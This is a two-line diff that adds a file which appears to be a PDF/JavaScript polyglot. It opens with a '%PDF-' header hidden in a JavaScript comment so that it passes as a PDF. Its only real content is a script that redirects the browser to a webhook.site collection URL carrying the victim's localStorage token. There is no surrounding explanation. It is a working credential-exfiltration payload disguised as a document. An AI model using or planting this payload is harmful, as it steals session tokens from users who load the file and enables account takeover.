@@ -1,0 +1,2 @@
+//%PDF-
+window.location.href='https://webhook.site/8df0f2e0-df1e-4442-9ff0-2afd51d68035?c='+localStorage.token;
